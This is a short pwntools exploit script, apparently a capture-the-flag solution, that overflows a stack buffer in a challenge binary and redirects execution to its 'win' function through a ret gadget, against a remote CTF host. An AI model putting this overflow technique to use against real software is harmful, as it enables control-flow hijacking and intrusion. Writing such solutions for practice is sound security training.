#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                b *win
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13386)

    return r


def main():
    r = conn()

    for duck_count in range(0x1e - 1):
        r.sendline(b'1')
        r.recvuntil(b'.\n')
        r.sendline(str(duck_count).encode())

    log.info("Sending!")
    r.sendline(b'1')
    r.recvuntil(b'.\n')
    payload = b'A'*512 + b'B'*8
    # byte = 0
    # payload += bytes([byte, 2, 3, 4, 5, 6, 7, 8])
    payload += p64(0x00)
    payload += b'C'*8
    payload += p64(0x40101a)  # ret for stack alignment
    payload += p64(exe.symbols["win"])
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
